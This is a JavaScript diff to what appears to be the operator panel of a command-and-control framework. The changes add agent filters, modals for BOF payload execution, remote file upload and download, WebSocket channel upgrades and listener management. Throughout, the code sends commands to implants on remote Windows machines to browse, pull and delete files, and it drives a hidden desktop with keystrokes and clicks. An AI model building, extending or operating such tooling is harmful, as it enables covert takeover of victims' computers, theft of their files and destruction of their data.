@@ -12,6 +12,7 @@
     var consoleTabs = {};  // agentId -> {tab, pane}
 
     var API = '/api';
+    var agentFilter = 'all';
 
     function escapeHtml(str) {
         if (!str) return '';
@@ -217,8 +218,9 @@
             case 'agent_result':
                 addEventLog('agent_result', data.agent_id + ': ' + data.command);
                 if (consoleTabs[data.agent_id]) {
-                    if (data.output && String(data.output).indexOf('HDIMG:') === 0) showDesktopFrame(data.agent_id, data.output);
-                    else appendConsole(data.agent_id, data.output, 'output');
+                    if (data.output && String(data.output).indexOf('HDIMG') === 0) {
+                        if (String(data.output).indexOf('HDIMG:') === 0) showDesktopFrame(data.agent_id, data.output);
+                    } else appendConsole(data.agent_id, data.output, 'output');
                 }
                 for (var i = 0; i < agents.length; i++) {
                     if (agents[i].id === data.agent_id) {
@@ -285,14 +287,21 @@
         var empty = document.getElementById('no-agents');
         tbody.innerHTML = '';
 
-        if (agents.length === 0) {
+        var filtered = agents;
+        if (agentFilter === 'beacon') {
+            filtered = agents.filter(function(a) { return a.mode === 'beacon' || a.mode === 'http_poll'; });
+        } else if (agentFilter === 'streaming') {
+            filtered = agents.filter(function(a) { return a.mode !== 'beacon' && a.mode !== 'http_poll'; });
+        }
+
+        if (filtered.length === 0) {
             empty.classList.remove('hidden');
             return;
         }
         empty.classList.add('hidden');
 
-        for (var i = 0; i < agents.length; i++) {
-            var agent = agents[i];
+        for (var i = 0; i < filtered.length; i++) {
+            var agent = filtered[i];
             var tr = document.createElement('tr');
             tr.dataset.agentId = agent.id;
             var healthClass = agent.active !== false ? 'healthy' : (agent.health_warning ? 'dead' : 'stale');
@@ -355,7 +364,7 @@
                     openDesktop(selectedAgentId);
                     break;
                 case 'bof':
-                    document.getElementById('bof-file').click();
+                    openBofModal(selectedAgentId);
                     break;
                 case 'sleep':
                     var interval = prompt('Beacon interval (seconds):');
@@ -376,15 +385,10 @@
                     listFiles(selectedAgentId);
                     break;
                 case 'download':
-                    var dl = prompt('Remote file path:');
-                    if (dl) await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'download', path: dl });
+                    openDownloadModal(selectedAgentId);
                     break;
                 case 'upload':
-                    var up = prompt('Remote path and base64, separated by |:');
-                    if (up && up.indexOf('|') > 0) {
-                        var parts = up.split('|');
-                        await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'upload', path: parts[0], data: parts.slice(1).join('|') });
-                    }
+                    openUploadModal(selectedAgentId);
                     break;
                 case 'upgrade':
                     await api('POST', '/agents/' + selectedAgentId + '/upgrade');
@@ -392,6 +396,19 @@
                 case 'downgrade':
                     var di = prompt('Beacon interval (seconds):', '60');
                     if (di) await api('POST', '/agents/' + selectedAgentId + '/downgrade', { interval: parseInt(di) });
+                    break;
+                case 'upgrade_ws':
+                    var wsHost = prompt('WebSocket host:', location.hostname);
+                    if (wsHost) {
+                        var wsPort = prompt('WebSocket port:', '8443');
+                        if (wsPort) await api('POST', '/agents/' + selectedAgentId + '/upgrade_ws', { ws_host: wsHost, ws_port: parseInt(wsPort) });
+                    }
+                    break;
+                case 'remove':
+                    if (confirm('Remove agent ' + selectedAgentId + ' from tracking?')) {
+                        await api('DELETE', '/agents/' + selectedAgentId);
+                        refreshAgents();
+                    }
                     break;
                 case 'kill':
                     if (confirm('Kill agent ' + selectedAgentId + '?')) {
@@ -442,14 +459,23 @@
                     '<input type="text" class="hd-type" id="hd-type-' + escapeHtml(agentId) + '" placeholder="Type on the hidden desktop, Enter to send">' +
                 '</div>' +
                 '<div class="fs-pane" id="fs-' + escapeHtml(agentId) + '">' +
-                    '<div class="hd-bar">' +
-                        '<span>Files</span>' +
-                        '<input type="text" class="fs-path" id="fs-path-' + escapeHtml(agentId) + '" value="C:\\Users\\Public">' +
-                        '<button type="button" class="glass-btn" data-fs="list">List</button>' +
-                        '<button type="button" class="glass-btn" data-fs="up">Up</button>' +
-                        '<label class="glass-btn">Upload<input type="file" class="fs-upload" id="fs-up-' + escapeHtml(agentId) + '" hidden></label>' +
+                    '<div class="fs-toolbar">' +
+                        '<button type="button" class="fs-nav-btn" data-fs="up" title="Up">\u2191</button>' +
+                        '<button type="button" class="fs-nav-btn" data-fs="refresh" title="Refresh">\u21BB</button>' +
+                        '<div class="fs-breadcrumb" id="fs-crumb-' + escapeHtml(agentId) + '"></div>' +
+                        '<input type="text" class="fs-path" id="fs-path-' + escapeHtml(agentId) + '" value="C:\\">' +
+                        '<button type="button" class="fs-nav-btn" data-fs="go" title="Go">Go</button>' +
                     '</div>' +
-                    '<div class="fs-list" id="fs-list-' + escapeHtml(agentId) + '"></div>' +
+                    '<div class="fs-actions">' +
+                        '<label class="glass-btn fs-act-btn">\u2191 Upload<input type="file" class="fs-upload" id="fs-up-' + escapeHtml(agentId) + '" hidden></label>' +
+                        '<button type="button" class="glass-btn fs-act-btn" data-fs="mkdir">\u2795 New Folder</button>' +
+                    '</div>' +
+                    '<div class="fs-table-wrap">' +
+                        '<table class="fs-table" id="fs-list-' + escapeHtml(agentId) + '">' +
+                            '<thead><tr><th class="fs-th-icon"></th><th class="fs-th-name">Name</th><th class="fs-th-size">Size</th><th class="fs-th-act"></th></tr></thead>' +
+                            '<tbody></tbody>' +
+                        '</table>' +
+                    '</div>' +
                 '</div>';
             document.getElementById('tab-content').appendChild(pane);
 
@@ -498,10 +524,21 @@
             var hdPane = document.getElementById('hd-' + agentId);
             hdPane.addEventListener('pointerdown', function(e) { desktopClick(e, e.button === 2); });
             hdPane.addEventListener('contextmenu', function(e) { e.preventDefault(); });
-            img.addEventListener('keydown', function(e) {
-                if (e.key.length === 1) desktopActionFor(agentId, 'type ' + e.key);
-                else if (e.key === 'Enter') desktopActionFor(agentId, 'key 13');
-                else if (e.key === 'Backspace') desktopActionFor(agentId, 'key 8');
+            var hdCanvas = document.getElementById('hd-canvas-' + agentId);
+            var VK_MAP = {
+                'Tab': 9, 'Enter': 13, 'Escape': 27, 'Backspace': 8, 'Delete': 46,
+                'ArrowLeft': 37, 'ArrowUp': 38, 'ArrowRight': 39, 'ArrowDown': 40,
+                'Home': 36, 'End': 35, 'PageUp': 33, 'PageDown': 34,
+                'F1': 112, 'F2': 113, 'F3': 114, 'F4': 115, 'F5': 116, 'F6': 117,
+                'F7': 118, 'F8': 119, 'F9': 120, 'F10': 121, 'F11': 122, 'F12': 123
+            };
+            if (hdCanvas) hdCanvas.addEventListener('keydown', function(e) {
+                e.preventDefault();
+                if (e.key.length === 1 && !e.ctrlKey && !e.altKey) {
+                    desktopActionFor(agentId, 'type ' + e.key);
+                } else if (VK_MAP[e.key]) {
+                    desktopActionFor(agentId, 'key ' + VK_MAP[e.key]);
+                }
             });
             var typer = document.getElementById('hd-type-' + agentId);
             typer.addEventListener('keydown', function(e) {
@@ -511,7 +548,11 @@
                 desktopActionFor(agentId, 'type ' + typer.value);
                 typer.value = '';
             });
-            pane.querySelector('[data-fs="list"]').addEventListener('click', function() { listFiles(agentId); });
+            pane.querySelector('[data-fs="go"]').addEventListener('click', function() { listFiles(agentId); });
+            pane.querySelector('[data-fs="refresh"]').addEventListener('click', function() { listFiles(agentId); });
+            document.getElementById('fs-path-' + agentId).addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') listFiles(agentId);
+            });
             pane.querySelector('[data-fs="up"]').addEventListener('click', function() {
                 var box = document.getElementById('fs-path-' + agentId);
                 var parts = box.value.replace(/\\+$/, '').split('\\');
@@ -519,17 +560,27 @@
                 box.value = parts.join('\\') || 'C:\\';
                 listFiles(agentId);
             });
+            var mkdirBtn = pane.querySelector('[data-fs="mkdir"]');
+            if (mkdirBtn) mkdirBtn.addEventListener('click', function() {
+                var name = prompt('New folder name:');
+                if (!name) return;
+                var dest = document.getElementById('fs-path-' + agentId).value.replace(/\\+$/, '') + '\\' + name;
+                api('POST', '/agents/' + agentId + '/command', { command: 'mkdir ' + dest });
+                addEventLog('files', 'mkdir ' + dest);
+                setTimeout(function() { listFiles(agentId); }, 2500);
+            });
             pane.querySelector('.fs-upload').addEventListener('change', function(ev) {
                 var file = ev.target.files && ev.target.files[0];
                 ev.target.value = '';
                 if (!file) return;
-                if (file.size > 400000) { addEventLog('files', 'upload too large'); return; }
+                if (file.size > 2000000) { addEventLog('files', 'upload too large (>2MB)'); return; }
                 var reader = new FileReader();
                 reader.onload = function() {
                     var b64 = String(reader.result).split(',')[1] || '';
                     var dest = document.getElementById('fs-path-' + agentId).value.replace(/\\+$/, '') + '\\' + file.name;
                     api('POST', '/agents/' + agentId + '/command', { command: '__fs:put:' + dest + '\t' + b64 });
                     addEventLog('files', 'upload ' + dest);
+                    setTimeout(function() { listFiles(agentId); }, 3000);
                 };
                 reader.readAsDataURL(file);
             });
@@ -548,9 +599,15 @@
     function closeConsole(agentId) {
         var entry = consoleTabs[agentId];
         if (!entry) return;
+        if (desktopTimers[agentId]) {
+            clearTimeout(desktopTimers[agentId]);
+            delete desktopTimers[agentId];
+        }
         entry.tab.remove();
         entry.pane.remove();
         delete consoleTabs[agentId];
+        delete lastFramePayload[agentId];
+        delete desktopScreen[agentId];
         switchTab('event-log');
     }
 
@@ -791,54 +848,111 @@
         if (img) img.focus();
     }
 
+    function updateBreadcrumb(agentId, path) {
+        var crumb = document.getElementById('fs-crumb-' + agentId);
+        if (!crumb) return;
+        var parts = path.replace(/\\+$/, '').split('\\');
+        crumb.innerHTML = parts.map(function(p, i) {
+            var sub = parts.slice(0, i + 1).join('\\') || 'C:\\';
+            return '<button type="button" class="fs-crumb-seg" data-path="' + escapeHtml(sub) + '">' + escapeHtml(p || 'C:') + '</button>';
+        }).join('<span class="fs-crumb-sep">\u203A</span>');
+        crumb.querySelectorAll('.fs-crumb-seg').forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                document.getElementById('fs-path-' + agentId).value = btn.dataset.path || 'C:\\';
+                listFiles(agentId);
+            });
+        });
+    }
+
+    function formatSize(bytes) {
+        var n = parseInt(bytes, 10);
+        if (isNaN(n) || n < 0) return '';
+        if (n === 0) return '0 B';
+        if (n < 1024) return n + ' B';
+        if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
+        if (n < 1073741824) return (n / 1048576).toFixed(1) + ' MB';
+        return (n / 1073741824).toFixed(1) + ' GB';
+    }
+
     async function listFiles(agentId) {
         var path = document.getElementById('fs-path-' + agentId).value || 'C:\\';
-        var ps = path.replace(/\\/g, '/');
-        await api('POST', '/agents/' + agentId + '/command', { command: 'powershell -c Get-ChildItem -Name ' + ps });
+        updateBreadcrumb(agentId, path);
+        var table = document.getElementById('fs-list-' + agentId);
+        if (table) {
+            var tbody = table.querySelector('tbody');
+            if (tbody) tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;opacity:.5;padding:12px">Loading...</td></tr>';
+        }
+        await api('POST', '/agents/' + agentId + '/command', { command: 'ls ' + path });
         addEventLog('files', 'list ' + path);
-        setTimeout(function() { showFileList(agentId, path); }, 2500);
+        setTimeout(function() { showFileList(agentId, path); }, 3000);
     }
 
     async function showFileList(agentId, path) {
-        var box = document.getElementById('fs-list-' + agentId);
-        if (!box) return;
+        var table = document.getElementById('fs-list-' + agentId);
+        if (!table) return;
+        var tbody = table.querySelector('tbody');
+        if (!tbody) return;
         var rows = await api('GET', '/agents/' + agentId + '/results');
         if (!rows) return;
         for (var i = rows.length - 1; i >= 0; i--) {
             var cmd = rows[i].command || '';
             var out = rows[i].output || '';
-            if ((cmd.indexOf('dir ') === 0 || cmd.indexOf('__fs:ls:') === 0) && out.indexOf('HDIMG:') !== 0 && out.indexOf('FILE:') !== 0) {
+            if ((cmd.indexOf('ls ') === 0 || cmd.indexOf('dir ') === 0 || cmd.indexOf('__fs:ls:') === 0) && out.indexOf('HDIMG:') !== 0 && out.indexOf('FILE:') !== 0) {
                 var entries = [];
-                if (cmd.indexOf('__fs:ls:') === 0) {
-                    out.split('\n').filter(Boolean).forEach(function(line) {
-                        var bits = line.split(' ');
-                        var kind = bits.shift();
-                        bits.shift();
-                        entries.push({ kind: kind, name: bits.join(' ') });
-                    });
-                } else {
-                    out.split('\n').forEach(function(line) {
-                        var name = line.trim();
-                        if (!name || name === '.' || name === '..') return;
-                        if (name.indexOf('File Not Found') === 0 || name.indexOf('Get-ChildItem') === 0) return;
-                        entries.push({ kind: name.indexOf('.') < 0 ? 'd' : 'f', name: name });
-                    });
+                out.split('\n').filter(Boolean).forEach(function(line) {
+                    line = line.replace(/\r$/, '').trim();
+                    if (!line || line === '.' || line === '..' || line.indexOf('Directory is empty') === 0) return;
+                    if (line.indexOf('Error:') === 0) { entries.push({ kind: 'e', name: line, size: '' }); return; }
+                    var m = line.match(/^([d\-])\s+(\S+)\s+(.+)$/);
+                    if (m) {
+                        entries.push({ kind: m[1], size: m[2].trim(), name: m[3].trim() });
+                    } else if (line.indexOf('File Not Found') < 0 && line.indexOf('Volume') < 0 && line.indexOf('Directory of') < 0 && line.indexOf(' File(s)') < 0 && line.indexOf(' Dir(s)') < 0 && line.indexOf(' bytes') < 0) {
+                        entries.push({ kind: line.indexOf('.') < 0 ? 'd' : '-', size: '', name: line.trim() });
+                    }
+                });
+                entries.sort(function(a, b) { if (a.kind === 'd' && b.kind !== 'd') return -1; if (a.kind !== 'd' && b.kind === 'd') return 1; return a.name.localeCompare(b.name); });
+                if (!entries.length) {
+                    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;opacity:.5;padding:12px">Empty directory</td></tr>';
+                    return;
                 }
-                box.innerHTML = entries.map(function(row) {
-                    return '<button type="button" class="fs-row" data-kind="' + row.kind + '" data-name="' + escapeHtml(row.name) + '">' +
-                        escapeHtml((row.kind === 'd' ? 'dir  ' : 'file ') + row.name) + '</button>';
-                }).join('') || escapeHtml(out.slice(0, 400));
-                box.querySelectorAll('.fs-row').forEach(function(btn) {
-                    btn.addEventListener('click', function() {
-                        var next = path.replace(/\\+$/, '') + '\\' + btn.dataset.name;
-                        if (btn.dataset.kind === 'd') {
+                tbody.innerHTML = entries.map(function(row) {
+                    var icon = row.kind === 'd' ? '\uD83D\uDCC1' : '\uD83D\uDCC4';
+                    var sizeStr = row.kind === 'd' ? '' : formatSize(row.size);
+                    return '<tr class="fs-entry" data-kind="' + row.kind + '" data-name="' + escapeHtml(row.name) + '">' +
+                        '<td class="fs-td-icon">' + icon + '</td>' +
+                        '<td class="fs-td-name">' + escapeHtml(row.name) + '</td>' +
+                        '<td class="fs-td-size">' + sizeStr + '</td>' +
+                        '<td class="fs-td-act">' +
+                            (row.kind !== 'd' ? '<button type="button" class="fs-dl-btn" title="Download">\u2B07</button>' : '') +
+                            '<button type="button" class="fs-del-btn" title="Delete">\u2716</button>' +
+                        '</td></tr>';
+                }).join('');
+                tbody.querySelectorAll('.fs-entry').forEach(function(tr) {
+                    var name = tr.querySelector('.fs-td-name');
+                    if (name) name.addEventListener('dblclick', function() {
+                        var next = path.replace(/\\+$/, '') + '\\' + tr.dataset.name;
+                        if (tr.dataset.kind === 'd') {
                             document.getElementById('fs-path-' + agentId).value = next;
                             listFiles(agentId);
-                        } else {
-                            api('POST', '/agents/' + agentId + '/postex', { op: 'download', path: next });
-                            addEventLog('files', 'get ' + next);
-                            setTimeout(function() { saveRemoteFile(agentId, btn.dataset.name); }, 2500);
                         }
+                    });
+                    var dlBtn = tr.querySelector('.fs-dl-btn');
+                    if (dlBtn) dlBtn.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        var fpath = path.replace(/\\+$/, '') + '\\' + tr.dataset.name;
+                        api('POST', '/agents/' + agentId + '/postex', { op: 'download', path: fpath });
+                        addEventLog('files', 'download ' + fpath);
+                        setTimeout(function() { saveRemoteFile(agentId, tr.dataset.name); }, 3000);
+                    });
+                    var delBtn = tr.querySelector('.fs-del-btn');
+                    if (delBtn) delBtn.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        var fpath = path.replace(/\\+$/, '') + '\\' + tr.dataset.name;
+                        if (!confirm('Delete ' + fpath + '?')) return;
+                        var delCmd = tr.dataset.kind === 'd' ? 'rmdir /s /q "' + fpath + '"' : 'del /f "' + fpath + '"';
+                        api('POST', '/agents/' + agentId + '/command', { command: delCmd });
+                        addEventLog('files', 'delete ' + fpath);
+                        setTimeout(function() { listFiles(agentId); }, 2500);
                     });
                 });
                 return;
@@ -862,23 +976,32 @@
     }
 
     var frameBusy = {};
+    var desktopPollRate = {};
     function watchDesktop(agentId) {
         if (desktopTimers[agentId]) return;
-        desktopTimers[agentId] = setInterval(function() {
-            if (frameBusy[agentId]) return;
+        desktopPollRate[agentId] = 2000;
+        function tick() {
+            if (frameBusy[agentId]) {
+                desktopTimers[agentId] = setTimeout(tick, desktopPollRate[agentId]);
+                return;
+            }
             frameBusy[agentId] = true;
             api('POST', '/agents/' + agentId + '/desktop', { command: 'frame' }).catch(function() {}).then(function() {
                 frameBusy[agentId] = false;
                 pollDesktop(agentId);
+                if (desktopPollRate[agentId] < 3000) desktopPollRate[agentId] += 200;
+                desktopTimers[agentId] = setTimeout(tick, desktopPollRate[agentId]);
             });
-        }, 2000);
+        }
+        desktopTimers[agentId] = setTimeout(tick, 500);
     }
 
     async function desktopActionFor(agentId, action) {
         addEventLog('desktop', agentId + ' ' + action);
         if (action === 'start' || action.indexOf('start ') === 0) watchDesktop(agentId);
+        desktopPollRate[agentId] = 800;
         await api('POST', '/agents/' + agentId + '/desktop', { command: action });
-        setTimeout(function() { pollDesktop(agentId); }, 800);
+        setTimeout(function() { pollDesktop(agentId); }, 600);
     }
 
     function bmpToPng(b64) {
@@ -990,22 +1113,21 @@
             var box = document.getElementById('listener-list');
             if (!rows || !rows.length) { box.textContent = 'No listeners'; return; }
             box.innerHTML = rows.map(function(l) {
-                return '<span class="listener-chip">' + escapeHtml(l.type) + ' ' + escapeHtml(String(l.host)) + ':' + l.port + '</span>';
+                return '<span class="listener-chip">' + escapeHtml(l.type) + ' ' + escapeHtml(String(l.host)) + ':' + l.port +
+                    ' <button class="listener-stop" data-type="' + escapeHtml(l.type) + '" title="Stop">&times;</button></span>';
             }).join('');
+            box.querySelectorAll('.listener-stop').forEach(function(btn) {
+                btn.addEventListener('click', async function(e) {
+                    e.stopPropagation();
+                    var ltype = btn.dataset.type;
+                    if (confirm('Stop ' + ltype + ' listener?')) {
+                        await api('DELETE', '/listeners/' + ltype);
+                        loadListeners();
+                    }
+                });
+            });
         } catch (e) {}
     }
-    document.getElementById('bof-file').addEventListener('change', function(e) {
-        var file = e.target.files && e.target.files[0];
-        e.target.value = '';
-        if (!file || !selectedAgentId) return;
-        var reader = new FileReader();
-        reader.onload = async function() {
-            var b64 = String(reader.result).split(',')[1] || '';
-            var result = await api('POST', '/agents/' + selectedAgentId + '/bof', { bof_data: b64, args: '', entry: 'go' });
-            addEventLog('bof', selectedAgentId + ': ' + (result.output || 'queued'));
-        };
-        reader.readAsDataURL(file);
-    });
     document.getElementById('btn-listener').addEventListener('click', async function() {
         var type = prompt('Listener type: http, ws, dns, smb', 'http');
         if (!type) return;
@@ -1016,6 +1138,220 @@
         loadListeners();
     });
     loadListeners();
+
+    // --- Agent filter tabs ---
+    document.querySelectorAll('.filter-btn').forEach(function(btn) {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.filter-btn').forEach(function(b) { b.classList.remove('active'); });
+            btn.classList.add('active');
+            agentFilter = btn.dataset.filter;
+            renderAgentTable();
+        });
+    });
+
+    // --- Env-keying toggle ---
+    var envCheck = document.querySelector('input[name="env_keying_check"]');
+    if (envCheck) {
+        envCheck.addEventListener('change', function() {
+            document.getElementById('env-keying-row').classList.toggle('hidden', !this.checked);
+        });
+    }
+
+    // --- BOF Modal ---
+    var bofFileData = null;
+    var bofAgentId = null;
+
+    function openBofModal(agentId) {
+        bofAgentId = agentId;
+        bofFileData = null;
+        document.getElementById('bof-file-name').textContent = 'No file selected';
+        document.getElementById('bof-entry').value = 'go';
+        document.getElementById('bof-args').value = '';
+        document.getElementById('bof-run-btn').disabled = true;
+        document.getElementById('bof-status').classList.add('hidden');
+        document.getElementById('bof-modal').classList.remove('hidden');
+    }
+
+    document.getElementById('bof-pick-btn').addEventListener('click', function() {
+        document.getElementById('bof-pick').click();
+    });
+
+    document.getElementById('bof-pick').addEventListener('change', function(e) {
+        var file = e.target.files && e.target.files[0];
+        e.target.value = '';
+        if (!file) return;
+        document.getElementById('bof-file-name').textContent = file.name + ' (' + formatSize(file.size) + ')';
+        var reader = new FileReader();
+        reader.onload = function() {
+            bofFileData = String(reader.result).split(',')[1] || '';
+            document.getElementById('bof-run-btn').disabled = false;
+        };
+        reader.readAsDataURL(file);
+    });
+
+    document.getElementById('bof-run-btn').addEventListener('click', async function() {
+        if (!bofFileData || !bofAgentId) return;
+        var entry = document.getElementById('bof-entry').value.trim() || 'go';
+        var args = document.getElementById('bof-args').value.trim();
+        var statusEl = document.getElementById('bof-status');
+        statusEl.textContent = 'Sending BOF to agent...';
+        statusEl.style.color = 'var(--amber)';
+        statusEl.classList.remove('hidden');
+        try {
+            var result = await api('POST', '/agents/' + bofAgentId + '/bof', { bof_data: bofFileData, args: args, entry: entry });
+            statusEl.textContent = result.output || result.message || 'BOF queued';
+            statusEl.style.color = 'var(--green)';
+            addEventLog('bof', bofAgentId + ': ' + entry + ' → ' + (result.output || 'queued'));
+        } catch(e) {
+            statusEl.textContent = 'Error: ' + e.message;
+            statusEl.style.color = 'var(--red)';
+        }
+    });
+
+    document.getElementById('bof-cancel-btn').addEventListener('click', function() {
+        document.getElementById('bof-modal').classList.add('hidden');
+        bofFileData = null;
+    });
+
+    // --- Upload Modal ---
+    var uploadFileData = null;
+    var uploadFileName = '';
+    var uploadAgentId = null;
+
+    function openUploadModal(agentId) {
+        uploadAgentId = agentId;
+        uploadFileData = null;
+        uploadFileName = '';
+        document.getElementById('upload-file-info').textContent = 'No file selected';
+        var fsPath = document.getElementById('fs-path-' + agentId);
+        document.getElementById('upload-remote-path').value = fsPath ? fsPath.value.replace(/\\+$/, '') + '\\' : 'C:\\Users\\Public\\';
+        document.getElementById('upload-go-btn').disabled = true;
+        document.getElementById('upload-size-warn').classList.add('hidden');
+        document.getElementById('upload-status').classList.add('hidden');
+        document.getElementById('upload-modal').classList.remove('hidden');
+    }
+
+    document.getElementById('upload-pick-btn').addEventListener('click', function() {
+        document.getElementById('upload-pick').click();
+    });
+
+    document.getElementById('upload-pick').addEventListener('change', function(e) {
+        var file = e.target.files && e.target.files[0];
+        e.target.value = '';
+        if (!file) return;
+        document.getElementById('upload-file-info').textContent = file.name + ' (' + formatSize(file.size) + ')';
+        var remPath = document.getElementById('upload-remote-path');
+        if (remPath.value.match(/\\$/)) remPath.value += file.name;
+        if (file.size > 2000000) {
+            document.getElementById('upload-size-warn').classList.remove('hidden');
+            document.getElementById('upload-go-btn').disabled = true;
+            return;
+        }
+        document.getElementById('upload-size-warn').classList.add('hidden');
+        var reader = new FileReader();
+        reader.onload = function() {
+            uploadFileData = String(reader.result).split(',')[1] || '';
+            uploadFileName = file.name;
+            document.getElementById('upload-go-btn').disabled = false;
+        };
+        reader.readAsDataURL(file);
+    });
+
+    document.getElementById('upload-go-btn').addEventListener('click', async function() {
+        if (!uploadFileData || !uploadAgentId) return;
+        var dest = document.getElementById('upload-remote-path').value.trim();
+        if (!dest) return;
+        var statusEl = document.getElementById('upload-status');
+        statusEl.textContent = 'Uploading...';
+        statusEl.style.color = 'var(--amber)';
+        statusEl.classList.remove('hidden');
+        try {
+            await api('POST', '/agents/' + uploadAgentId + '/command', { command: '__fs:put:' + dest + '\t' + uploadFileData });
+            statusEl.textContent = 'Upload queued: ' + dest;
+            statusEl.style.color = 'var(--green)';
+            addEventLog('files', 'upload ' + dest);
+        } catch(e) {
+            statusEl.textContent = 'Error: ' + e.message;
+            statusEl.style.color = 'var(--red)';
+        }
+    });
+
+    document.getElementById('upload-cancel-btn').addEventListener('click', function() {
+        document.getElementById('upload-modal').classList.add('hidden');
+        uploadFileData = null;
+    });
+
+    // --- Download Modal ---
+    var downloadAgentId = null;
+
+    function openDownloadModal(agentId) {
+        downloadAgentId = agentId;
+        document.getElementById('download-remote-path').value = '';
+        document.getElementById('download-status').classList.add('hidden');
+        document.getElementById('download-modal').classList.remove('hidden');
+        document.getElementById('download-remote-path').focus();
+    }
+
+    document.getElementById('download-go-btn').addEventListener('click', async function() {
+        if (!downloadAgentId) return;
+        var path = document.getElementById('download-remote-path').value.trim();
+        if (!path) return;
+        var statusEl = document.getElementById('download-status');
+        statusEl.textContent = 'Requesting file...';
+        statusEl.style.color = 'var(--amber)';
+        statusEl.classList.remove('hidden');
+        try {
+            await api('POST', '/agents/' + downloadAgentId + '/postex', { op: 'download', path: path });
+            statusEl.textContent = 'Download queued. Waiting for agent response...';
+            addEventLog('files', 'download ' + path);
+            var fname = path.split('\\').pop() || 'download.bin';
+            var attempts = 0;
+            var dlPoll = setInterval(async function() {
+                attempts++;
+                if (attempts > 20) {
+                    clearInterval(dlPoll);
+                    statusEl.textContent = 'Timed out waiting for file';
+                    statusEl.style.color = 'var(--red)';
+                    return;
+                }
+                try {
+                    var rows = await api('GET', '/agents/' + downloadAgentId + '/results');
+                    if (!rows) return;
+                    for (var i = rows.length - 1; i >= 0; i--) {
+                        var out = rows[i].output || '';
+                        if (out.indexOf('FILE:') === 0) {
+                            clearInterval(dlPoll);
+                            var a = document.createElement('a');
+                            a.href = 'data:application/octet-stream;base64,' + out.slice(5);
+                            a.download = fname;
+                            a.click();
+                            statusEl.textContent = 'Downloaded: ' + fname;
+                            statusEl.style.color = 'var(--green)';
+                            return;
+                        }
+                    }
+                } catch(e) {}
+            }, 2000);
+        } catch(e) {
+            statusEl.textContent = 'Error: ' + e.message;
+            statusEl.style.color = 'var(--red)';
+        }
+    });
+
+    document.getElementById('download-remote-path').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') document.getElementById('download-go-btn').click();
+    });
+
+    document.getElementById('download-cancel-btn').addEventListener('click', function() {
+        document.getElementById('download-modal').classList.add('hidden');
+    });
+
+    // Close modals on overlay click
+    ['bof-modal', 'upload-modal', 'download-modal'].forEach(function(id) {
+        document.getElementById(id).addEventListener('click', function(e) {
+            if (e.target === this) this.classList.add('hidden');
+        });
+    });
 
     // --- Auto-refresh agents every 5s ---
     setInterval(refreshAgents, 5000);
